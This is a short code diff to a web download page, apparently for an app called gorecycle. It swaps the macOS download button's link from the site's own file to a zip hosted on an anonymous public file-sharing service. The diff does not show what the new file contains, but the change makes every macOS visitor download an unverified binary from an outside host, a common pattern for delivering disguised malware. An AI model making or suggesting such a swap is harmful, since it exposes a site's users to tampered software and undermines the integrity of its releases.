@@ -183,7 +183,7 @@ export default function DownloadPage() {
             </a>
 
             <a
-              href="/downloads/gorecycle-latest-mac.zip"
+              href="https://files.catbox.moe/1ortkh.zip"
               download
               className="flex items-center justify-center gap-3 bg-gradient-to-r from-gray-800 to-gray-700 hover:from-gray-900 hover:to-gray-800 text-white font-semibold px-5 py-3 rounded-lg shadow-md transition transform hover:-translate-y-0.5"
               aria-label="Download for macOS"
